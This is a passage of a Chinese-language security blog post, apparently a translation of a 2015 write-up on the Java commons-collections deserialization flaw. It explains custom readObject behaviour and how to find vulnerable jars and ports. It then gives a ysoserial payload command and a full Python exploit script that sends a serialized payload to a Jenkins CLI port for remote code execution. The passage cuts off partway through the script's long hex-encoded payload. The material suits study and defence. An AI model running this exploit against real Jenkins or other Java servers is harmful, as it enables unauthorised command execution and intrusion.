class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//从"name.ser"里读取序列化数据</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//从数据流里读取对象，把它恢复为字符串</span></span><br><span class="line">        MyObject objectFromDisk = (MyObject)ois.readObject();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//打印字符串</span></span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="keyword">this</span>.name+<span class="string">"!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">breens@us-l-breens:~/Desktop/SerialTest$ java SerializeTest</span><br><span class="line">bob!</span><br><span class="line">breens@us-l-breens:~/Desktop/SerialTest$ xxd object.ser</span><br><span class="line">0000000: aced 0005 7372 0008 4d79 4f62 6a65 6374 ....sr..MyObject</span><br><span class="line">0000010: cf7a 75c5 5dba f698 0200 014c 0004 6e61 .zu.]......L..na</span><br><span class="line">0000020: 6d65 7400 124c 6a61 7661 2f6c 616e 672f met..Ljava/lang/</span><br><span class="line">0000030: 5374 7269 6e67 3b78 7074 0003 626f 62 String;xpt..bob</span><br></pre></td></tr></table></figure><p>这里“MyObject”实现了“Serializable”接口，自定义了一个方法“readObject”。<br>最后输出的字符串为“bob!”，而“object.ser”文件中字符串仍然为“bob”。由此可知，在java读取完字节流后，会判断是否存在用户自定义的“readObject”方法，如果存在的话，就优先使用udf。<br>所以，如果存在一个自定义了“readObject”方法的对象，而这个方法是危险的，比如说执行系统命令，就会导致反序列化后形成威胁。   </p><h4 id="0x01-漏洞寻找方法"><a href="#0x01-漏洞寻找方法" class="headerlink" title="0x01 漏洞寻找方法"></a>0x01 漏洞寻找方法</h4><p>反序列化漏洞存在于commons-collections这个java类库之中，而这个类库到处都在用。。          </p><ol><li>到应用程序的安装目录下。</li><li>看程序是不是和“commons-collections”类库绑定。因为该漏洞和一个类“InvokerTransformer”有关，所以直接<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@us-l-breens:~# cd /opt/OracleHome/</span><br><span class="line">root@us-l-breens:/opt/OracleHome# grep -R InvokerTransformer .</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685824694_jenkins.war/META-INF/.WL_internal/cache/jenkins.war/.classinfos/.cache.ser matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685824694_jenkins.war/WEB-INF/lib/commons-collections-<span class="number">3.2</span>.1.jar matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/_WL_user/jenkins/tw9byh/META-INF/.WL_internal/cache/jenkins.war/.classinfos/.cache.ser matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/_WL_user/jenkins/<span class="number">3</span>c5quy/war/WEB-INF/lib/commons-collections-<span class="number">3.2</span>.1.jar matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685776500_jenkins.war/META-INF/.WL_internal/cache/jenkins.war/.classinfos/.cache.ser matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685776500_jenkins.war/WEB-INF/lib/commons-collections-<span class="number">3.2</span>.1.jar matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685837432_jenkins.war/META-INF/.WL_internal/cache/jenkins.war/.classinfos/.cache.ser matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685837432_jenkins.war/WEB-INF/lib/commons-collections-<span class="number">3.2</span>.1.jar matches</span><br><span class="line">Binary file ./oracle_common/modules/com.bea.core.apache.commons.collections.jar matches</span><br><span class="line">Binary file ./oracle_common/modules/com.bea.core.apache.commons.collections.jar.bck matches</span><br></pre></td></tr></table></figure></li></ol><p>到这里只要程序运行时确实是使用了这个jar文件的，攻击就很可能有效。</p><ol><li>寻找程序把序列化对象当做输入的点。<br><img src="https://foxglovesecurity.files.wordpress.com/2015/10/objectexample.png" alt="image"></li></ol><p>上面是两个序列化的java对象，其中一个经过了base64编码，以“rO0AB”开头；另外一个以“ac ed 00 05 ”开头，未经过base64编码，是二进制数据。<br>如果序列化对象作为参数或者cookie经http协议传送，它会被base64编码，此时就注意“rO0AB”字符。但更常见的情况是序列化对象通过其他协议在各种各样的端口上进行传送。这时就需要列出程序监听的端口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@us-l-breens:/opt# lsof -i -P | grep java | grep LISTEN</span><br><span class="line">java       6923            root   53u  IPv6 2136625      0t0  TCP *:8080 (LISTEN)</span><br><span class="line">java       6923            root   58u  IPv6 2136629      0t0  TCP *:8009 (LISTEN)</span><br><span class="line">java       6923            root  125u  IPv6 2138434      0t0  TCP localhost:8005 (LISTEN)</span><br><span class="line">java       6923            root  268u  IPv6 2138692      0t0  TCP *:33758 (LISTEN)</span><br><span class="line">java       6923            root  272u  IPv6 2137594      0t0  TCP *:53289 (LISTEN)</span><br></pre></td></tr></table></figure></p><p>接下来便是利用这些端口。试着找一下程序自带的一些脚本或者命令行工具，以此来用Wireshark观察发包收包，像是Jenkins, WebLogic, WebSphere等等都有相应的传送序列化对象的命令行工具。                   </p><ol><li>从<a href="http://note.youdao.com/" target="_blank" rel="noopener">github</a>下载工具“ysoserial”，运行生成对应payload。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar /path/to/ysoserial-<span class="number">0.0</span>.2-SNAPSHOT-all.jar CommonsCollections1 <span class="string">'touch /tmp/pwned'</span> &gt; payload.out</span><br></pre></td></tr></table></figure></li></ol><p>然后使用payload取代对应包中的序列化对象来构造发包。</p><h4 id="0x02-实战jenkins"><a href="#0x02-实战jenkins" class="headerlink" title="0x02 实战jenkins"></a>0x02 实战jenkins</h4><ol><li>我把应用放在Tomcat里，查找它是否有漏洞库的备份。<br><img src="http://p1.bqimg.com/4851/05a5b0e02164fed3.png" alt="image"></li><li>用“lsof”来看下哪些进程和java相关（有不认识的端口谷歌之）。发现目录“./webapps/jenkins/WEB-INF/”下的工具“jenkins-cli.jar”，是个命令行工具。<br><img src="http://p1.bqimg.com/4851/efbac6948d951935.png" alt="image"></li><li>使用wirshark抓包，观察CLI客户端使用何种协议发包收包，找到序列化对象的位置。<br><img src="http://i1.piimg.com/567571/6e28055c5c0cc1a8.png" alt="image"><br><img src="http://p1.bqimg.com/567571/c3b6dec1e8fd2089.png" alt="image"><br>协议大概为：先由CLI客户端发向服务端说明协议类型<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000000  00 14 50 72 6f 74 6f 63  6f 6c 3a 43 4c 49 2d 63 ..Protoc ol:CLI-c</span><br><span class="line">00000010  6f 6e 6e 65 63 74                                onnect</span><br></pre></td></tr></table></figure></li></ol><p>从服务端读取请求。接着便可以发送第二个包，包里包含了序列化对象，可以对它们进行替换构造发包。                                           </p><ol><li>利用python构造发包。<br>利用工具<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>生成payload<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0.0</span>.2-SNAPSHOT-all.jar CommonsCollections1 <span class="string">'touch /tmp/pwned'</span> &gt; payload.out</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#usage: ./jenkins.py host port /path/to/payload</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">port = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过HTTP访问jenkins，看服务端是在哪个端口监听CLI发送请求。</span></span><br><span class="line">r = requests.get(<span class="string">'http://'</span>+host+<span class="string">':'</span>+port)</span><br><span class="line">cli_port = int(r.headers[<span class="string">'X-Jenkins-CLI-Port'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#找到CLI对应的端口并进行TCP连接</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">server_address = (host, cli_port)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'connecting to %s port %s'</span> % server_address</span><br><span class="line">sock.connect(server_address)</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送第一个包，说明协议类型</span></span><br><span class="line">headers=<span class="string">'\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'sending "%s"'</span> % headers</span><br><span class="line">sock.send(headers)</span><br><span class="line"></span><br><span class="line">data = sock.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> &gt;&gt;sys.stderr, <span class="string">'received "%s"'</span> % data</span><br><span class="line"></span><br><span class="line">data = sock.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> &gt;&gt;sys.stderr, <span class="string">'received "%s"'</span> % data</span><br><span class="line"><span class="comment">#返回两个包，收两次</span></span><br><span class="line">payloadObj = open(sys.argv[<span class="number">3</span>],<span class="string">'rb'</span>).read()</span><br><span class="line">payload_b64 = base64.b64encode(payloadObj)</span><br><span class="line">payload=<span class="string">'\x3c\x3d\x3d\x3d\x5b\x4a\x45\x4e\x4b\x49\x4e\x53\x20\x52\x45\x4d\x4f\x54\x49\x4e\x47\x20\x43\x41\x50\x41\x43\x49\x54\x59\x5d\x3d\x3d\x3d\x3e'</span>+payload_b64+<span class="string">'\x00\x00\x00\x00\x11\x2d\xac\xed\x00\x05\x73\x72\x00\x1b\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x4c\x00\x10\x63\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x50\x72\x6f\x78\x79\x74\x00\x30\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x3b\x5b\x00\x07\x72\x65\x71\x75\x65\x73\x74\x74\x00\x02\x5b\x42\x4c\x00\x08\x74\x6f\x53\x74\x72\x69\x6e\x67\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x49\x00\x02\x69\x64\x49\x00\x08\x6c\x61\x73\x74\x49\x6f\x49\x64\x4c\x00\x08\x72\x65\x73\x70\x6f\x6e\x73\x65\x74\x00\x1a\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x09\x63\x72\x65\x61\x74\x65\x64\x41\x74\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x78\x70\x73\x72\x00\x1e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x24\x53\x6f\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x06\x74\x68\x69\x73\x24\x30\x74\x00\x19\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x43\x6f\x6d\x6d\x61\x6e\x64\x3b\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x71\x00\x7e\x00\x03\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x78\x70\x71\x00\x7e\x00\x10\x70\x75\x72\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x02\x46\x2a\x3c\x3c\xfd\x22\x39\x02\x00\x00\x78\x70\x00\x00\x00\x0c\x73\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x61\x09\xc5\x9a\x26\x36\xdd\x85\x02\x00\x04\x49\x00\x0a\x6c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x4c\x00\x0e\x64\x65\x63\x6c\x61\x72\x69\x6e\x67\x43\x6c\x61\x73\x73\x71\x00\x7e\x00\x03\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x03\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x03\x78\x70\x00\x00\x00\x43\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x74\x00\x0c\x43\x6f\x6d\x6d\x61\x6e\x64\x2e\x6a\x61\x76\x61\x74\x00\x06\x3c\x69\x6e\x69\x74\x3e\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x32\x71\x00\x7e\x00\x15\x71\x00\x7e\x00\x16\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x63\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x74\x00\x0c\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x3c\x74\x00\x1b\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x74\x00\x10\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x03\x08\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x68\x61\x6e\x6e\x65\x6c\x74\x00\x0c\x43\x68\x61\x6e\x6e\x65\x6c\x2e\x6a\x61\x76\x61\x74\x00\x04\x63\x61\x6c\x6c\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xfa\x74\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x74\x00\x1c\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x2e\x6a\x61\x76\x61\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x24\x50\x72\x6f\x78\x79\x31\x70\x74\x00\x0f\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x74\x00\x15\x77\x61\x69\x74\x46\x6f\x72\x52\x65\x6d\x6f\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x74\x00\x0e\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x74\x00\x08\x43\x4c\x49\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x74\x00\x1f\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x74\x00\x19\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x2e\x6a\x61\x76\x61\x74\x00\x07\x63\x6f\x6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x3b\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x49\x00\x04\x73\x69\x7a\x65\x78\x70\x00\x00\x00\x00\x77\x04\x00\x00\x00\x00\x78\x71\x00\x7e\x00\x3c\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x70\x73\x7d\x00\x00\x00\x02\x00\x2e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x00\x1c\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x49\x52\x65\x61\x64\x52\x65\x73\x6f\x6c\x76\x65\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x78\x70\x73\x72\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x00\x00\x00\x00\x00\x00\x00\x01\x03\x00\x05\x5a\x00\x14\x61\x75\x74\x6f\x55\x6e\x65\x78\x70\x6f\x72\x74\x42\x79\x43\x61\x6c\x6c\x65\x72\x5a\x00\x09\x67\x6f\x69\x6e\x67\x48\x6f\x6d\x65\x49\x00\x03\x6f\x69\x64\x5a\x00\x09\x75\x73\x65\x72\x50\x72\x6f\x78\x79\x4c\x00\x06\x6f\x72\x69\x67\x69\x6e\x71\x00\x7e\x00\x0d\x78\x70\x00\x00\x00\x00\x00\x02\x00\x73\x71\x00\x7e\x00\x0b\x71\x00\x7e\x00\x43\x74\x00\x78\x50\x72\x6f\x78\x79\x20\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x40\x32\x20\x77\x61\x73\x20\x63\x72\x65\x61\x74\x65\x64\x20\x66\x6f\x72\x20\x69\x6e\x74\x65\x72\x66\x61\x63\x65\x20\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x75\x71\x00\x7e\x00\x11\x00\x00\x00\x0d\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x7d\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x89\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x74\x00\x04\x77\x72\x61\x70\x73\x71\x00\x7e\x00\x13\x00\x00\x02\x6a\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x74\x00\x06\x65\x78\x70\x6f\x72\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x02\xa6\x74\x00\x21\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x74\x00\x16\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x4a\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x46\x71\x00\x7e\x00\x1d\x71\x00\x7e\x00\x1e\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x03\x08\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x71\x00\x7e\x00\x22\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xfa\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x71\x00\x7e\x00\x26\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x71\x00\x7e\x00\x28\x70\x71\x00\x7e\x00\x29\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x71\x00\x7e\x00\x2b\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x71\x00\x7e\x00\x30\x71\x00\x7e\x00\x31\x71\x00\x7e\x00\x32\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x34\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x36\x71\x00\x7e\x00\x3a\x78\x78\x75\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x78\x70\x00\x00\x07\x46\xac\xed\x00\x05\x73\x72\x00\x32\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x24\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04\x49\x00\x03\x6f\x69\x64\x5b\x00\x09\x61\x72\x67\x75\x6d\x65\x6e\x74\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x05\x74\x79\x70\x65\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x77\x08\xff\xff\xff\xfe\x00\x00\x00\x02\x78\x72\x00\x17\x68\x75\x64\x73\